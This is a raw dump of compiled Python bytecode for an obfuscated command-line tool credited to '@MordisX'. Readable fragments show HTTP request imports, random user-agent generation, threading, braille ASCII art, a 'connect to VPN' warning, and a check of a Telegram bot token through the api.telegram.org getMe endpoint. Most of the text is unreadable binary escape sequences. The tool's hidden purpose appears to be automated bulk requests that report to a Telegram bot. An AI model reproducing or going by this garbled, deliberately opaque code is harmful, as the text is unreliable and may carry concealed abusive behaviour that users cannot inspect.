d\000d\001l\000Z\000d\000d\001l!Z!d\000d\001l\"Z\"d\000d\013l#m$Z$\001\000d\000d\001l\003Z\003d\000d\001l%Z%d\000d\014l&T\000d\000d\rl m'Z(\001\000d\000d\016l&m)Z*\001\000d\000d\017l\000m+Z,\001\000d\000d\020l\000m-Z.\001\000d\000d\001l/Z/d\000d\001l0Z0d\000d\001l1Z1d\000d\021l m2Z2\001\000d\000d\001l\001Z\001d\000d\016l&m)Z)\001\000d\000d\022l3m4Z4\001\000d\000d\023l5m6Z7\001\000d\000d\022l3m4Z8\001\000d\000d\024l5m9Z:\001\000d\000d\023l5m6Z7\001\000d\000d\025l;m<Z=\001\000d\000d\025l;m<Z>\001\000d\000d\023l5m6Z6\001\000d\000d\026l?m@Z@\001\000d\027ZAd\030ZBd\031ZCd\032ZDd\030ZBd\033ZEd\034ZFd\035ZGd\036ZHd\034ZId\037ZJd ZKd!ZLd\"ZMd#ZNd$ZOd#ZPd%ZQd&ZRd'ZSd\000aTd\000ZUd\000ZVd\000ZWd\000ZXd\000d\001l Z d\000d\001l\002Z\002d(\204\000ZYd)\204\000ZZd*\204\000Z[\002\000e\\eJ\233\000d+\235\002\246\001\000\000\253\001\000\000\000\000\000\000\000\000Z]\002\000eZe]\246\001\000\000\253\001\000\000\000\000\000\000\000\000r+\002\000e\\d,eM\233\000d-\235\003\246\001\000\000\253\001\000\000\000\000\000\000\000\000Z^\002\000e[e]e^\246\002\000\000\253\002\000\000\000\000\000\000\000\000\001\000\002\000e\002j\006\000\000\000\000\000\000\000\000d\007\246\001\000\000\253\001\000\000\000\000\000\000\000\000\001\000\002\000e\003j_\000\000\000\000\000\000\000\000d.\246\001\000\000\253\001\000\000\000\000\000\000\000\000\001\000d\000Z`d\000aTd\000aad\000abd\000acd\000adi\000Zed/\204\000Zfd\000d\001l\002Z\002d0ZNd1eN\233\000d2eJ\233\000d3eN\233\000d4eJ\233\000d5eN\233\000d6eJ\233\000d7eN\233\000d8eJ\233\000d7eN\233\000d9eJ\233\000d:\235\025Zgeg\240h\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000d,\246\001\000\000\253\001\000\000\000\000\000\000\000\000D\000]\035Zi\002\000e\037ei\246""\001\000\000\253\001\000\000\000\000\000\000\000\000\001\000\002\000e\002j\006\000\000\000\000\000\000\000\000d;\246\001\000\000\253\001\000\000\000\000\000\000\000\000\001\000\214\036\002\000e\\eJ\233\000d<eS\233\000\235\003\246\001\000\000\253\001\000\000\000\000\000\000\000\000Zjejd=k\002\000\000\000\000r\005d>Zkd?Zlnmejd@k\002\000\000\000\000r\005d?ZkdAZlnbejdBk\002\000\000\000\000r\005dAZkdCZlnWejdDk\002\000\000\000\000r\005dCZkdEZlnLejdFk\002\000\000\000\000r\005dEZkdGZlnAejdHk\002\000\000\000\000r\005dGZkdIZln6ejdJk\002\000\000\000\000r\005dIZkdKZln+ejdLk\002\000\000\000\000r\005dKZkdMZln ejdNk\002\000\000\000\000r\005dMZkdOZln\025ejdPk\002\000\000\000\000r\005d>ZkdOZln\n\002\000em\246\000\000\000\253\000\000\000\000\000\000\000\000\000\001\000\t\000\t\000dRZg\002\000e jn\000\000\000\000\000\000\000\000\246\000\000\000\253\000\000\000\000\000\000\000\000\000Zoeo\2402\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000eg\246\001\000\000\253\001\000\000\000\000\000\000\000\000Zpepjq\000\000\000\000\000\000\000\000\2402\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000dS\246\001\000\000\253\001\000\000\000\000\000\000\000\000Zrn\010#\000\001\000Y\000n\003x\003Y\000w\001\214JdTZsdU\204\000Zt\002\000et\246\000\000\000\253\000\000\000\000\000\000\000\000\000\001\000dV\204\000Zu\002\000eu\246\000\000\000\253\000\000\000\000\000\000\000\000\000\001\000dW\204\000ZvdX\204\000ZwdY\204\000ZxdZ\204\000Zyd[\204\000Zzd\\\204\000Z{d]\204\000ZX\002\000e|d^\246\001\000\000\253\001\000\000\000\000\000\000\000\000D\000] Z}\002\000e$eX\254_\246\001\000\000\253\001\000\000\000\000\000\000\000\000\240~\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\246\000\000\000\253\000\000\000\000\000\000\000\000\000\001\000\214!d\001S\000)`\351\000\000\000\000N)\001\332\004Fore)\001\332\005sleepc\002\000\000\000\000\000\000\000\000\000\000\000\005\000\000\000\003\000\000\000\363\264\000\000\000\227\000|""\000d\001z\000\000\000D\000]Q}\002t\000\000\000\000\000\000\000\000\000\000\000j\001\000\000\000\000\000\000\000\000\240\002\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000|\001|\002z\000\000\000\246\001\000\000\253\001\000\000\000\000\000\000\000\000\001\000t\000\000\000\000\000\000\000\000\000\000\000j\001\000\000\000\000\000\000\000\000\240\003\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\246\000\000\000\253\000\000\000\000\000\000\000\000\000\001\000t\t\000\000\000\000\000\000\000\000\000\000d\002\246\001\000\000\253\001\000\000\000\000\000\000\000\000\001\000\214Rd\000S\000)\003N\372\001\ng\007\374\232~\014$5?)\005\332\003sys\332\006stdout\332\005write\332\005flushr\003\000\000\000)\003\332\001s\332\005color\332\003ASUs\003\000\000\000   \332\006module\332\005combor\016\000\000\000\010\000\000\000s^\000\000\000\200\000\330\017\020\2204\211x\360\000\003\005\034\360\000\003\005\034\210\003\335\010\013\214\n\327\010\030\322\010\030\230\025\240\023\231\033\321\010%\324\010%\320\010%\335\010\013\214\n\327\010\030\322\010\030\321\010\032\324\010\032\320\010\032\335\010\r\210l\321\010\033\324\010\033\320\010\033\320\010\033\360\007\003\005\034\360\000\003\005\034\363\000\000\000\000z\017color_state.txt\332\001r\351\001\000\000\000\332\001wu\203\020\000\000\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\210\342\240\221\342\242\246\342\241\210\342\240\262\342\243\204\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\n\342\240\200\342\240\200\342\240\200\342\240\200\342\240""\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\273\342\240\267\342\243\266\342\240\242\342\240\244\342\242\204\342\243\200\342\240\200\342\240\200\342\240\231\342\242\206\342\240\210\342\240\242\342\241\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\n\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\231\342\240\242\342\243\204\342\240\210\342\240\231\342\240\262\342\242\204\342\241\200\342\240\261\342\243\204\342\240\221\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\n\342\240\200\342\240\222\342\240\222\342\240\222\342\240\222\342\240\202\342\240\244\342\240\244\342\240\244\342\240\244\342\243\200\342\243\200\342\243\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\210\342\240\263\342\243\204\342\240\200\342\240\200\342\240\231\342\240\242\342\241\230\342\242\246\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\n\342\240\200\342\240\200\342\240\200\342\240\200\342\242\262\342\241\247\342\242\204\342\243\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\210\342\240\211\342\240\211\342\240\221\342\240\222\342\240\262\342\240\244\342\240\244\342\243""\200\342\241\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\210\342\242\243\342\240\200\342\240\200\342\240\200\342\240\231\342\243\206\342\242\263\342\241\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\n\342\240\200\342\240\200\342\240\200\342\240\200\342\241\277\342\241\207\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\210\342\240\231\342\240\262\342\242\244\342\243\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\242\243\342\240\200\342\240\200\342\240\200\342\240\230\342\241\206\342\240\261\342\241\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\n\342\240\200\342\240\200\342\240\200\342\240\200\342\241\207\342\240\271\342\241\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\220\342\240\242\342\240\204\342\243\210\342\240\221\342\240\246\342\243\204\342\240\200\342\240\200\342\240\200\342\240\200\342\240\230\342\241\207\342\240\200\342\240\200\342\240\200\342\242\271\342\240\200\342\240\271\342\241\204\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\n\342\242\204\342\241\200\342\240\200\342\240\200\342\243\207\342\240\200\342\240\261\342\243\204\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\242\244\342\243\244\342\243\204\342\241\200\342\240\200\342\240\200\342\240\200\342\240\211\342\240\223\342\240\242\342\242\235\342\241\242\342\243\204\342\241\200\342\242\240\342\241\207\342\240\200\342\240""\200\342\240\200\342\242\270\342\240\200\342\240\200\342\240\271\342\241\204\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\n\342\243\204\342\240\231\342\240\242\342\241\200\342\240\270\342\241\204\342\240\200\342\240\210\342\240\242\342\243\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\270\342\243\267\342\243\246\342\240\210\342\240\211\342\240\211\342\240\211\342\242\222\342\243\246\342\243\200\342\240\200\342\242\210\342\243\240\342\240\237\342\241\237\342\240\200\342\240\200\342\240\200\342\240\200\342\241\274\342\240\200\342\240\200\342\240\200\342\240\271\342\241\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\n\342\242\273\342\243\246\342\240\200\342\240\210\342\240\202\342\240\271\342\243\204\342\240\200\342\240\200\342\240\210\342\240\221\342\240\222\342\240\244\342\242\204\342\243\200\342\243\200\342\243\200\342\243\200\342\243\200\342\243\200\342\243\270\342\243\247\342\240\244\342\240\226\342\240\232\342\240\211\342\240\211\342\240\213\342\242\211\342\240\217\342\240\201\342\240\200\342\240\212\342\240\200\342\240\200\342\240\200\342\240\200\342\242\260\342\241\203\342\240\200\342\240\200\342\240\200\342\240\200\342\242\263\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\n\342\240\200\342\242\273\342\243\247\342\241\200\342\240\200\342\240\200\342\240\230\342\242\246\342\241\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\243\275\342\240\217\342\240\200\342\242\240\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\242\270\342\241\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\243\260\342\240\237\342\240\211\342\240\223\342\242\244\342\241\200\342\240\200\342\240\210\342\243\207\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\n\342\240\200\342\240\200\342""\240\271\342\243\267\342\241\204\342\240\200\342\240\200\342\240\200\342\240\211\342\240\262\342\242\204\342\241\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\241\217\342\240\200\342\243\200\342\243\270\342\243\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\263\342\243\204\342\241\200\342\242\200\342\243\200\342\240\244\342\240\232\342\240\211\342\240\221\342\240\242\342\243\200\342\240\200\342\240\261\342\241\204\342\240\200\342\240\270\342\241\200\342\240\200\342\240\200\342\240\200\342\240\200\n\342\240\200\342\240\200\342\240\200\342\240\230\342\242\277\342\243\206\342\241\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\210\342\240\211\342\240\222\342\240\240\342\240\244\342\242\204\342\243\200\342\243\200\342\241\260\342\240\200\342\240\222\342\242\242\342\240\222\342\240\211\342\240\201\342\240\201\342\241\240\342\240\244\342\242\204\342\240\200\342\240\230\342\240\273\342\241\227\342\242\244\342\241\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\221\342\242\246\342\241\230\342\242\246\342\240\200\342\242\207\342\240\200\342\240\200\342\240\200\342\240\200\n\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\231\342\240\253\342\242\267\342\241\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\202\342\240\220\342\243\246\342\240\264\342\242\267\342\243\244\342\243\204\342\243\230\342\243\206\342\243\200\342\243\240\342\243\236\342\243\267\342\240\222\342\240\222\342\240\200\342\240\200\342\242\240\342\242\247\342\243\200\342\240\210\342\240\263\342\242\204\342\241\200\342\240\200\342\240\200\342\240\200\342\240\231\342\242\246\342\243\263\342\243\274\342\240\200\342\240\200\342\240\200\342\240\200\n\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\210\342\240\223\342\240\246\342\243\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\210\342""\240\223\342\242\204\342\243\270\342\240\233\342\242\277\342\240\201\342\241\206\342\240\210\342\240\253\342\241\211\342\240\200\342\240\200\342\241\234\342\240\200\342\243\217\342\240\200\342\240\231\342\242\277\342\243\202\342\241\200\342\242\263\342\241\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\231\342\243\277\342\241\206\342\240\200\342\240\200\342\240\200\n\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\210\342\240\231\342\240\262\342\242\204\342\241\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\271\342\241\200\342\242\270\342\241\200\342\243\270\342\241\237\342\243\242\342\243\210\342\240\200\342\240\270\342\240\200\342\240\200\342\242\271\342\241\200\342\240\200\342\240\200\342\240\271\342\243\235\342\240\202\342\240\261\342\243\204\342\240\200\342\240\200\342\240\200\342\240\200\342\240\230\342\241\207\342\240\200\342\240\200\342\240\200\n\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\210\342\240\221\342\240\222\342\240\244\342\243\244\342\243\200\342\243\271\342\243\246\342\240\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\267\342\240\200\342\240\200\342\243\240\342\240\236\342\242\260\342\240\200\342\240\200\342\240\200\342\240\230\342\243\246\342\241\200\342\240\210\342\240\263\342\241\200\342\240\200\342\240\200\342\242\240\342\240\201\342\241\204\342\240\200\342\240\200\n\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\242\247\342\240\210\342\240\271\342\243\277\342\240\277\342\243\277\342\241\277\342\240\233\342\240\211\342\243\240\342\240\236\342\240\201\342\240\200\342\241\270\342""\240\200\342\242\204\342\240\200\342\240\200\342\240\230\342\241\217\342\240\262\342\241\200\342\240\261\342\241\200\342\240\200\342\241\270\342\240\200\342\240\200\342\240\200\342\240\200\n\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\230\342\241\204\342\240\200\342\241\277\342\240\200\342\240\210\342\240\201\342\240\200\342\241\264\342\240\211\342\240\200\342\240\200\342\242\240\342\240\207\342\240\200\342\240\230\342\241\204\342\240\200\342\243\200\342\240\274\342\240\222\342\240\276\342\242\246\342\243\231\342\243\244\342\241\207\342\242\270\342\240\200\342\240\200\342\240\200\n\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\242\261\342\241\200\342\240\223\342\241\226\342\242\262\342\240\222\342\240\213\342\240\200\342\240\200\342\240\200\342\242\200\342\241\236\342\240\200\342\240\200\342\240\200\342\241\250\342\240\212\342\240\263\342\243\204\342\240\200\342\240\200\342\240\200\342\240\210\342\242\273\342\240\201\342\240\230\342\240\200\342\240\200\342\240\200\n\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\242\200\342\241\267\342\240\232\342\240\231\342\241\207\342\240\200\342\240\200\342\242\200\342\240\206\342\240\200\342\241\234\342\240\200\342\240\200\342\241\240\342\240\212\342\240\200\342\240\200\342\240\200\342\240\210\342\242\243\342\240\200\342\240\200\342\243\200\342\241\274\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\n""\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\242\200\342\243\224\342\243\213\342\240\244\342\240\244\342\240\222\342\240\263\342\240\244\342\243\264\342\240\213\342\243\200\342\241\274\342\240\244\342\240\220\342\240\232\342\240\223\342\240\222\342\240\222\342\240\242\342\240\244\342\242\204\342\243\210\342\241\267\342\240\212\342\240\201\342\241\207\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\n\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\242\200\342\241\264\342\240\212\342\240\211\342\240\211\342\240\201\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\243\240\342\240\217\342\240\221\342\240\202\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\220\342\240\201\342\240\200\342\240\200\342\240\200\342\241\207\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\n\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\242\240\342\240\216\342\240\200\342\240\200\342\242\240\342\240\213\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\244\342\243\264\342\240\203\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\241\207\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\n\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\242\200\342\243\264\342\241\207\342\240\200""\342\240\200\342\242\240\342\240\207\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\242\200\342\241\267\342\240\202\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\241\200\342\240\210\342\241\207\342\240\200\342\240\200\342\240\200\342\240\200\342\242\230\n\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\241\236\342\240\220\342\240\201\342\240\200\342\240\200\342\241\236\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\242\270\342\240\244\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\243\207\342\240\200\342\242\263\342\240\200\342\240\200\342\240\200\342\240\200\342\240\230\n\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\241\207\342\240\200\342\240\200\342\240\200\342\243\270\342\240\207\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\242\274\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\242\200\342\241\264\342\241\273\342\243\204\342\240\200\342\240\207\342\240\200\342\240\200\342\240\200\342\240\200\n\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\243\247\342\240\224\342\240\212\342\240\211\342\240\210\342\243\267\342\241\204\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\210\342\243\207\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200""\342\240\200\342\240\200\342\240\200\342\240\200\342\243\200\342\243\200\342\243\266\342\240\237\342\240\231\342\240\212\342\240\200\342\240\210\342\242\242\342\241\200\342\241\204\342\240\200\342\240\200\342\240\200u\357\001\000\000\342\226\254\342\226\255\342\226\254\342\226\255\342\226\254\342\226\255\342\226\254\342\226\255\342\226\254\342\226\255\342\226\254\342\226\255\342\226\254\342\226\255\342\226\254\342\226\255\342\226\254\342\226\255\342\226\254\342\226\255\342\226\254\342\226\255\342\226\254\342\226\255\342\226\254\342\226\255\342\226\254\342\226\255\342\226\254\342\226\255\342\226\254\342\226\255\342\226\254\342\226\255\342\226\254\342\226\255\342\226\254\342\226\255\342\226\254\342\226\255\342\226\254\342\226\255\342\226\254\342\226\255\342\226\254\342\226\255\342\226\254\342\226\255\342\226\254\342\226\255\342\226\254\342\226\255\342\226\254\342\226\255\342\226\254\n      \342\232\240 \360\235\227\226\360\235\227\274\360\235\227\273\360\235\227\273\360\235\227\262\360\235\227\260\360\235\230\201 \360\235\227\247\360\235\227\274 \302\271\302\271\302\271\302\271 \360\235\227\251\360\235\227\275\360\235\227\273 \360\235\227\247\360\235\227\274 \360\235\227\250\360\235\230\200\360\235\227\262 \360\235\227\247\360\235\227\265\360\235\227\266\360\235\230\200 \360\235\227\247\360\235\227\274\360\235\227\274\360\235\227\271 ~\360\235\227\254\360\235\227\274\360\235\230\202\360\235\227\277\360\235\227\236\360\235\227\266\360\235\227\273\360\235\227\264 \342\232\240\n\342\226\254\342\226\255\342\226\254\342\226\255\342\226\254\342\226\255\342\226\254\342\226\255\342\226\254\342\226\255\342\226\254\342\226\255\342\226\254\342\226\255\342\226\254\342\226\255\342\226\254\342\226\255\342\226\254\342\226\255\342\226\254\342\226\255\342\226\254\342\226\255\342\226\254\342\226\255\342\226\254\342\226\255\342\226\254\342\226\255\342\226\254\342\226\255\342\226\254\342\226\255\342\226\254\342\226\255\342\226\254\342\226\255\342\226\254\342\226\255\342\226\254\342\226""\255\342\226\254\342\226\255\342\226\254\342\226\255\342\226\254\342\226\255\342\226\254\342\226\255\342\226\254\342\226\255\342\226\254\342\226\255\342\226\254)\001\332\006Thread)\001\332\001*)\001\332\004post)\001\332\023generate_user_agent)\001\332\006choice)\001\332\trandrange)\001\332\003get)\001\332\005Table)\001\332\007Console)\001\332\005Group)\001\332\rBeautifulSoup)\001\332\007Columnsz\007\033[1;33mz\007\033[1;97mz\007\033[2;36mz\007\033[1;34m\372\001\037z\007\033[1;32mz\007\033[1;31mz\013\033[38;5;208mz\t\033[1m\033[31mz\t\033[1m\033[32mz\t\033[1m\033[33mz\t\033[1m\033[34mz\t\033[1m\033[36mz\t\033[1m\033[35mz\t\033[1m\033[37mz\017\033[1m\033[38;5;208mz\004\033[0mc\000\000\000\000\000\000\000\000\000\000\000\000\006\000\000\000\003\000\000\000\363\230\000\000\000\227\000g\000d\001\242\001}\000|\000D\000]1}\001t\001\000\000\000\000\000\000\000\000\000\000t\002\000\000\000\000\000\000\000\000\000\000\233\000d\002|\001\233\000\235\003d\003\254\004\246\002\000\000\253\002\000\000\000\000\000\000\000\000\001\000t\005\000\000\000\000\000\000\000\000\000\000j\003\000\000\000\000\000\000\000\000d\005\246\001\000\000\253\001\000\000\000\000\000\000\000\000\001\000\2142t\001\000\000\000\000\000\000\000\000\000\000d\006d\003\254\004\246\002\000\000\253\002\000\000\000\000\000\000\000\000\001\000d\000S\000)\007N)\003\372\003...r!\000\000\000z\006 .....u\037\000\000\000C\312\234\341\264\207\341\264\204\341\264\213\311\252\311\264\311\242 T\341\264\217\341\264\213\341\264\207\311\264\372\001\r)\001\332\003endr\021\000\000\000z\024                    )\004\332\005print\332\004blue\332\004timer\003\000\000\000)\002\332\017loading_pattern\332\007patterns\002\000\000\000  r\r\000\000\000\332\016loading_effectr)\000\000\000\215\000\000\000se\000\000\000\200\000\330\026.\320\026.\320\026.\200O\330\023\"\360\000\002\005\026\360\000\002\005\026\210\007\335\010\r\2254\320\016C\320\016C\270\007\320\016C\320\016C\310\024\320\010N\321\010N\324\010N\320\010N\335\010\014\214\n\2201""\211\r\214\r\210\r\210\r\335\004\t\210(\230\004\320\004\035\321\004\035\324\004\035\320\004\035\320\004\035\320\004\035r\017\000\000\000c\001\000\000\000\000\000\000\000\000\000\000\000\010\000\000\000\003\000\000\000\363\252\001\000\000\227\000t\001\000\000\000\000\000\000\000\000\000\000d\001t\002\000\000\000\000\000\000\000\000\000\000\233\000d\002\235\003\246\001\000\000\253\001\000\000\000\000\000\000\000\000\001\000t\005\000\000\000\000\000\000\000\000\000\000\246\000\000\000\253\000\000\000\000\000\000\000\000\000\001\000d\003|\000\233\000d\004\235\003}\001t\007\000\000\000\000\000\000\000\000\000\000j\004\000\000\000\000\000\000\000\000|\001\246\001\000\000\253\001\000\000\000\000\000\000\000\000\240\005\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\246\000\000\000\253\000\000\000\000\000\000\000\000\000}\002|\002\240\004\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000d\005\246\001\000\000\253\001\000\000\000\000\000\000\000\000rS|\002d\006\031\000\000\000\000\000\000\000\000\000}\003|\003\240\004\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000d\007d\010\246\002\000\000\253\002\000\000\000\000\000\000\000\000}\004|\003\240\004\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000d\td\n\246\002\000\000\253\002\000\000\000\000\000\000\000\000}\005t\001\000\000\000\000\000\000\000\000\000\000d\001t\014\000\000\000\000\000\000\000\000\000\000\233\000d\013|\004\233\000d\014|\005\233\000\235\006\246\001\000\000\253\001\000\000\000\000\000\000\000\000\001\000d\rS\000t\001\000\000\000\000\000\000\000\000\000\000d\001t\014\000\000\000\000\000\000\000\000\000\000\233\000d\016\235\003\246\001\000\000\253\001\000\000\000\000\000\000\000\000\001\000d\017S\000)\020Nr\005\000\000\000u+\000\000\000T\341\264\217\341\264\217\312\237 C\312\200\341\264\207\341\264\200\341\264\233\341\264\207\341\264\205 B\312\217 : @MordisX\372\034https://api.telegram.org/""botz\006/getMe\332\002ok\332\006result\332\nfirst_namez\013Unknown Bot\332\010username\372\003N/Au<\000\000\000\360\235\227\225\360\235\227\274\360\235\230\201 \360\235\227\231\360\235\227\274\360\235\230\202\360\235\227\273\360\235\227\261 :\n \342\230\236 \360\235\227\241\360\235\227\256\360\235\227\272\360\235\227\262 : u+\000\000\000\n \342\230\236 \360\235\227\250\360\235\230\200\360\235\227\262\360\235\227\277\360\235\227\273\360\235\227\256\360\235\227\272\360\235\227\262 :  @Tu\204\000\000\000\342\235\214 I\311\264\341\264\240\341\264\200\312\237\311\252\341\264\205 T\341\264\217\341\264\213\341\264\207\311\264! P\312\237\341\264\207\341\264\200s\341\264\207 \312\200\341\264\207s\341\264\233\341\264\200\312\200\341\264\233 \341\264\200\311\264\341\264\205 \341\264\207\311\264\341\264\233\341\264\207\312\200 \341\264\200 \341\264\240\341\264\200\312\237\311\252\341\264\205 \312\231\341\264\217\341\264\233 